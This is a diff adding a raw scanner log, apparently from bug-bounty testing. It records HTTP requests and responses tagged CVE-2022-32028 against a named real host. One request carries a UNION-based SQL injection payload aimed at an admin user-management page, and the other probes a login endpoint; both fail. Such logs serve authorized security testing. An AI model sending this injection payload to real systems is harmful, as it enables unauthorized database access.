@@ -1,0 +1,53 @@
+[CVE-2022-32028] Dumped HTTP request for https://techsolutions.bitpanda.com/admin/ajax.php?action=login
+
+
+POST /admin/ajax.php?action=login HTTP/1.1
+Host: techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15
+Connection: close
+Content-Length: 43
+Content-Type: application/x-www-form-urlencoded
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+username={{username}}&password={{password}}
+[CVE-2022-32028] Dumped HTTP response https://techsolutions.bitpanda.com/admin/ajax.php?action=login
+
+HTTP/1.1 400 Bad Request
+Connection: close
+Content-Length: 11
+Date: Tue, 05 Aug 2025 12:53:22 GMT
+Via: 1.1 f96e72cfd61c675b75ea8547da63de24.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: 9KOYPNJ5qhcSVKky_-fmjjujo6C-5hEoLDTaiIf_uqo39HvTfauZDA==
+X-Amz-Cf-Pop: IAD55-P8
+X-Cache: LambdaGeneratedResponse from cloudfront
+
+Bad Request
+[CVE-2022-32028] Dumped HTTP request for https://techsolutions.bitpanda.com/admin/manage_user.php?id=-1%20union%20select%201,md5(999999999),3,4,5--+
+
+
+GET /admin/manage_user.php?id=-1%20union%20select%201,md5(999999999),3,4,5--+ HTTP/1.1
+Host: techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
+Connection: close
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+
+[CVE-2022-32028] Dumped HTTP response https://techsolutions.bitpanda.com/admin/manage_user.php?id=-1%20union%20select%201,md5(999999999),3,4,5--+
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 9
+Cache-Control: max-age=30
+Content-Type: text/plain
+Date: Tue, 05 Aug 2025 12:53:23 GMT
+Strict-Transport-Security: max-age=31536000
+Via: 1.1 cb2d413167decc675714b9b5dec4ad88.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: l5poLHbAumWsqqciS4LYCxdKyjX296onLhKXA1cHfqYEGZsshIUJ2g==
+X-Amz-Cf-Pop: IAD55-P8
+X-Amz-Id-2: mFV5BkFR9JcE/FOan+319YzJfmh5vr1D5TEt6g2z2ybUISbzxPKK3yjy7H9ljQ9NJprfnqB2zwU=
+X-Amz-Request-Id: 41Z75Q5XFS0PHC1X
+X-Cache: Error from cloudfront
+
+Not Found
